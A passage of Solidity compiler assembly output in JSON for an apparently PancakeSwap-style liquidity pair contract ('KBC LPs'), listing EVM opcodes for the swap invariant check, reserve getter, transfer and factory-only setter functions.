											"end": 13854,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13841,
											"end": 13850,
											"name": "DUP2"
										},
										{
											"begin": 13841,
											"end": 13854,
											"name": "GT"
										},
										{
											"begin": 13824,
											"end": 13854,
											"name": "tag",
											"value": "164"
										},
										{
											"begin": 13824,
											"end": 13854,
											"name": "JUMPDEST"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "PUSH [tag]",
											"value": "165"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "JUMPI"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "DUP2"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "MSTORE"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "ADD"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "DUP1"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "DUP1"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "ADD"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "DUP3"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "DUP2"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "SUB"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "DUP3"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "MSTORE"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "PUSH",
											"value": "22"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "DUP2"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "MSTORE"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "ADD"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "DUP1"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "PUSH data",
											"value": "50B0A6DD250A09C1CD083AD4BF9F97424665D60E7BC0A208A1151C7D0051999C"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "PUSH",
											"value": "22"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "SWAP2"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "CODECOPY"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "ADD"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "SWAP2"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "POP"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "POP"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "MLOAD"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "DUP1"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "SWAP2"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "SUB"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "SWAP1"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "REVERT"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "tag",
											"value": "165"
										},
										{
											"begin": 13803,
											"end": 13914,
											"name": "JUMPDEST"
										},
										{
											"begin": 14014,
											"end": 14035,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 14056,
											"end": 14098,
											"name": "PUSH [tag]",
											"value": "166"
										},
										{
											"begin": 14080,
											"end": 14097,
											"name": "PUSH [tag]",
											"value": "167"
										},
										{
											"begin": 14080,
											"end": 14089,
											"name": "DUP5"
										},
										{
											"begin": 14094,
											"end": 14096,
											"name": "PUSH",
											"value": "19"
										},
										{
											"begin": 14080,
											"end": 14097,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14080,
											"end": 14093,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 14080,
											"end": 14097,
											"name": "AND"
										},
										{
											"begin": 14080,
											"end": 14097,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14080,
											"end": 14097,
											"name": "tag",
											"value": "167"
										},
										{
											"begin": 14080,
											"end": 14097,
											"name": "JUMPDEST"
										},
										{
											"begin": 14056,
											"end": 14075,
											"name": "PUSH [tag]",
											"value": "169"
										},
										{
											"begin": 14056,
											"end": 14064,
											"name": "DUP8"
										},
										{
											"begin": 14069,
											"end": 14074,
											"name": "PUSH",
											"value": "2710"
										},
										{
											"begin": 14056,
											"end": 14075,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14056,
											"end": 14068,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 14056,
											"end": 14075,
											"name": "AND"
										},
										{
											"begin": 14056,
											"end": 14075,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14056,
											"end": 14075,
											"name": "tag",
											"value": "169"
										},
										{
											"begin": 14056,
											"end": 14075,
											"name": "JUMPDEST"
										},
										{
											"begin": 14056,
											"end": 14079,
											"name": "SWAP1"
										},
										{
											"begin": 14056,
											"end": 14098,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14056,
											"end": 14079,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 14056,
											"end": 14098,
											"name": "AND"
										},
										{
											"begin": 14056,
											"end": 14098,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14056,
											"end": 14098,
											"name": "tag",
											"value": "166"
										},
										{
											"begin": 14056,
											"end": 14098,
											"name": "JUMPDEST"
										},
										{
											"begin": 14014,
											"end": 14112,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 14126,
											"end": 14147,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 14168,
											"end": 14210,
											"name": "PUSH [tag]",
											"value": "171"
										},
										{
											"begin": 14192,
											"end": 14209,
											"name": "PUSH [tag]",
											"value": "167"
										},
										{
											"begin": 14192,
											"end": 14201,
											"name": "DUP5"
										},
										{
											"begin": 14206,
											"end": 14208,
											"name": "PUSH",
											"value": "19"
										},
										{
											"begin": 14192,
											"end": 14209,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14192,
											"end": 14205,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 14192,
											"end": 14209,
											"name": "AND"
										},
										{
											"begin": 14192,
											"end": 14209,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14168,
											"end": 14210,
											"name": "tag",
											"value": "171"
										},
										{
											"begin": 14168,
											"end": 14210,
											"name": "JUMPDEST"
										},
										{
											"begin": 14126,
											"end": 14224,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 14325,
											"end": 14371,
											"name": "PUSH [tag]",
											"value": "174"
										},
										{
											"begin": 14360,
											"end": 14370,
											"name": "PUSH",
											"value": "5F5E100"
										},
										{
											"begin": 14325,
											"end": 14355,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 14325,
											"end": 14340,
											"name": "DUP12"
										},
										{
											"begin": 14325,
											"end": 14340,
											"name": "DUP2"
										},
										{
											"begin": 14325,
											"end": 14340,
											"name": "AND"
										},
										{
											"begin": 14325,
											"end": 14340,
											"name": "SWAP1"
										},
										{
											"begin": 14325,
											"end": 14355,
											"name": "DUP12"
										},
										{
											"begin": 14325,
											"end": 14355,
											"name": "AND"
										},
										{
											"begin": 14325,
											"end": 14355,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14325,
											"end": 14344,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 14325,
											"end": 14355,
											"name": "AND"
										},
										{
											"begin": 14325,
											"end": 14355,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14325,
											"end": 14355,
											"name": "tag",
											"value": "175"
										},
										{
											"begin": 14325,
											"end": 14355,
											"name": "JUMPDEST"
										},
										{
											"begin": 14325,
											"end": 14359,
											"name": "SWAP1"
										},
										{
											"begin": 14325,
											"end": 14371,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14325,
											"end": 14359,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 14325,
											"end": 14371,
											"name": "AND"
										},
										{
											"begin": 14325,
											"end": 14371,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14325,
											"end": 14371,
											"name": "tag",
											"value": "174"
										},
										{
											"begin": 14325,
											"end": 14371,
											"name": "JUMPDEST"
										},
										{
											"begin": 14263,
											"end": 14301,
											"name": "PUSH [tag]",
											"value": "176"
										},
										{
											"begin": 14263,
											"end": 14279,
											"name": "DUP4"
										},
										{
											"begin": 14284,
											"end": 14300,
											"name": "DUP4"
										},
										{
											"begin": 14263,
											"end": 14301,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14263,
											"end": 14283,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 14263,
											"end": 14301,
											"name": "AND"
										},
										{
											"begin": 14263,
											"end": 14301,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14263,
											"end": 14301,
											"name": "tag",
											"value": "176"
										},
										{
											"begin": 14263,
											"end": 14301,
											"name": "JUMPDEST"
										},
										{
											"begin": 14263,
											"end": 14371,
											"name": "LT"
										},
										{
											"begin": 14263,
											"end": 14371,
											"name": "ISZERO"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "JUMPI"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "DUP1"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "DUP2"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "MSTORE"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "DUP3"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "ADD"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "MSTORE"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "DUP3"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "ADD"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "50616E63616B653A204B"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "B0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "DUP3"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "ADD"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "MSTORE"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "SWAP1"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "MLOAD"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "SWAP1"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "DUP2"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "SWAP1"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "SUB"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "ADD"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "SWAP1"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "REVERT"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "tag",
											"value": "177"
										},
										{
											"begin": 14238,
											"end": 14415,
											"name": "JUMPDEST"
										},
										{
											"begin": 1357,
											"end": 1358,
											"name": "POP"
										},
										{
											"begin": 1357,
											"end": 1358,
											"name": "POP"
										},
										{
											"begin": 14436,
											"end": 14485,
											"name": "PUSH [tag]",
											"value": "178"
										},
										{
											"begin": 14444,
											"end": 14452,
											"name": "DUP5"
										},
										{
											"begin": 14454,
											"end": 14462,
											"name": "DUP5"
										},
										{
											"begin": 14464,
											"end": 14473,
											"name": "DUP9"
										},
										{
											"begin": 14475,
											"end": 14484,
											"name": "DUP9"
										},
										{
											"begin": 14436,
											"end": 14443,
											"name": "PUSH [tag]",
											"value": "179"
										},
										{
											"begin": 14436,
											"end": 14485,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14436,
											"end": 14485,
											"name": "tag",
											"value": "178"
										},
										{
											"begin": 14436,
											"end": 14485,
											"name": "JUMPDEST"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "DUP1"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "MLOAD"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "DUP4"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "DUP2"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "MSTORE"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "DUP2"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "ADD"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "DUP4"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "SWAP1"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "MSTORE"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "DUP1"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "DUP3"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "ADD"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "DUP14"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "SWAP1"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "MSTORE"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "DUP2"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "ADD"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "DUP13"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "SWAP1"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "MSTORE"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "SWAP1"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "DUP12"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "AND"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "SWAP2"
										},
										{
											"begin": 14505,
											"end": 14515,
											"name": "CALLER"
										},
										{
											"begin": 14505,
											"end": 14515,
											"name": "SWAP2"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "PUSH",
											"value": "D78AD95FA46C994B6551D0DA85FC275FE613CE37657FB8D5E3D130840159D822"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "SWAP2"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "DUP2"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "SWAP1"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "SUB"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "ADD"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "SWAP1"
										},
										{
											"begin": 14500,
											"end": 14566,
											"name": "LOG3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1379,
											"end": 1380,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1368,
											"end": 1376,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1368,
											"end": 1380,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "tag",
											"value": "48"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMPDEST"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MLOAD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MSTORE"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MSTORE"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "4B4243204C5073"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "C8"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MSTORE"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "tag",
											"value": "54"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "JUMPDEST"
										},
										{
											"begin": 1599,
											"end": 1607,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 1599,
											"end": 1607,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1599,
											"end": 1607,
											"name": "DUP1"
										},
										{
											"begin": 1599,
											"end": 1607,
											"name": "DUP3"
										},
										{
											"begin": 1599,
											"end": 1607,
											"name": "AND"
										},
										{
											"begin": 1599,
											"end": 1607,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1629,
											"end": 1637,
											"name": "DUP4"
										},
										{
											"begin": 1629,
											"end": 1637,
											"name": "DIV"
										},
										{
											"begin": 1629,
											"end": 1637,
											"name": "SWAP1"
										},
										{
											"begin": 1629,
											"end": 1637,
											"name": "SWAP2"
										},
										{
											"begin": 1629,
											"end": 1637,
											"name": "AND"
										},
										{
											"begin": 1629,
											"end": 1637,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1669,
											"end": 1687,
											"name": "SWAP1"
										},
										{
											"begin": 1669,
											"end": 1687,
											"name": "DIV"
										},
										{
											"begin": 1669,
											"end": 1687,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1669,
											"end": 1687,
											"name": "AND"
										},
										{
											"begin": 1669,
											"end": 1687,
											"name": "SWAP1"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "tag",
											"value": "57"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "JUMPDEST"
										},
										{
											"begin": 2919,
											"end": 2923,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2935,
											"end": 2971,
											"name": "PUSH [tag]",
											"value": "182"
										},
										{
											"begin": 2944,
											"end": 2954,
											"name": "CALLER"
										},
										{
											"begin": 2956,
											"end": 2963,
											"name": "DUP5"
										},
										{
											"begin": 2965,
											"end": 2970,
											"name": "DUP5"
										},
										{
											"begin": 2935,
											"end": 2943,
											"name": "PUSH [tag]",
											"value": "183"
										},
										{
											"begin": 2935,
											"end": 2971,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2935,
											"end": 2971,
											"name": "tag",
											"value": "182"
										},
										{
											"begin": 2935,
											"end": 2971,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 2988,
											"end": 2992,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "tag",
											"value": "181"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "JUMPDEST"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP3"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP2"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "POP"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "POP"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "tag",
											"value": "59"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "JUMPDEST"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "AND"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "DUP2"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "tag",
											"value": "62"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "JUMPDEST"
										},
										{
											"begin": 2730,
											"end": 2737,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 2730,
											"end": 2737,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2730,
											"end": 2737,
											"name": "AND"
										},
										{
											"begin": 2716,
											"end": 2726,
											"name": "CALLER"
										},
										{
											"begin": 2716,
											"end": 2737,
											"name": "EQ"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "PUSH [tag]",
											"value": "185"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "JUMPI"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "DUP1"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "DUP2"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "MSTORE"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "DUP3"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "ADD"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "MSTORE"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "PUSH",
											"value": "12"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "DUP3"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "ADD"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "2830B731B0B5B29D102327A92124A22222A7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "71"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "DUP3"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "ADD"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "MSTORE"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "SWAP1"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "MLOAD"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "SWAP1"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "DUP2"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "SWAP1"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "SUB"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "ADD"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "SWAP1"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "REVERT"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "tag",
											"value": "185"
										},
										{
											"begin": 2708,
											"end": 2760,
											"name": "JUMPDEST"
										},
										{
											"begin": 2790,
											"end": 2796,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 2790,
											"end": 2806,
											"name": "DUP1"
										},
										{
											"begin": 2790,
											"end": 2806,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
